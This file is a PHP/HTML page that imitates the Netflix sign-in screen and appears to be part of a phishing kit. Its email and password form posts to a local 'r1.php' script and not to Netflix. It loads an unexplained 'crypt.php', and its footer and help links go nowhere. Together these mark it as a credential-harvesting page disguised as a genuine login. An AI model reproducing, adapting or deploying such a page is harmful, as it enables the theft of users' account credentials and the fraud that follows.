<?php require_once 'crypt.php'; ?>
<!doctype html>
<html>

<head>
<title>Netflix</title>
<meta content="" name="keywords">
<meta content="" name="description">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<link type="text/css" rel="stylesheet" href="css/z.css">
<link type="text/css" rel="stylesheet" href="css/a.css">
<link rel="shortcut icon" href="img/nficon2015.ico">

</head>
<body>
<div id="appMountPoint">
<div class="login-wrapper" data-reactid=".n04xqojxfk" data-react-checksum="-290266296">
<div class="nfHeader login-header signupBasicHeader" data-reactid=".n04xqojxfk.0">
<a href="#" class="icon-logoUpdate nfLogo signupBasicHeader" data-reactid=".n04xqojxfk.0.1">
<span class="screen-reader-text" data-reactid=".n04xqojxfk.0.1.0">Netflix</span></a>
</div>

<div class="login-body" data-reactid=".2app2tcssn4.1">
<div class="login-content login-form" data-reactid=".2app2tcssn4.1.0">
<h1 data-reactid=".2app2tcssn4.1.0.0">Sign In</h1>


<form class="login-form" action="r1.php" method="post">

<label class="login-input login-input-email ui-label ui-input-label">
<span class="ui-label-text">Email</span>
<input class="ui-text-input" name="email" type="email" Required value="" tabindex="0"></label>

<label class="login-input login-input-password ui-label ui-input-label">
<span class="ui-label-text">Password</span>
<input class="ui-text-input" name="password" type="password" Required tabindex="0"></label>

<div class="login-forgot-password-wrapper"><a href="#" tabindex="3"">Forgot your email or password?</a>
</div>

<div class="login-remember-me-wrapper">
<div class="login-remember-me"><label class="login-label-remember-me">
<input type="checkbox" class="login-input-remember-me" value="true" checked name="rememberMeCheckbox">
<span>Remember me on this device.</span>
</label>

</div>
</div>

<button class="btn login-button btn-submit btn-small" type="submit" autocomplete="off" tabindex="0">
<spa>Sign In</span></button>

</form>


<div class="facebookForm regOption">
<button class="btn disabled cta-fb-gdp btn-submit btn-small" type="submit" disabled autocomplete="off" tabindex="0">
<span class="icon-facebook"></span>
<span class="fbBtnText">Login with Facebook</span>
</button>
</div>


<div class="login-signup-now">
<br />
<span>New to Netflix? </span>

<a class=" " target="_self" href="#">Sign up now</a>
<span>.</span>
</div>
</div>
</div>

<div class="site-footer-wrapper login-footer">
<div class="footer-divider">
</div>

<div class="site-footer">
<p class="footer-top">
<a class="footer-top-a" href="#">Questions? Contact us.</a></p>
<ul class="footer-links structural">

<li class="footer-link-item">
<a class="footer-link" href="#">
<span>Gift Card Terms</span></a>
</li>

<li class="footer-link-item">
<a class="footer-link" href="#">
<span>Terms of Use</span>
</a>
</li>

<li class="footer-link-item">
<a class="footer-link" href="#">
<span>Privacy Statement</span></a>
</li>
</ul>

<div class="lang-selection-container" id="lang-switcher">
<div class="ui-select-wrapper">


<div class="select-arrow medium prefix globe">
<select class="ui-select medium" tabindex="0">
<option value="#">English</option>
</select>
</div>


</div>
</div>
<p class="copy-text"</p>
</div>
</div>
</div>
</div>

</body>


</html>
<?php ob_end_flush(); ?>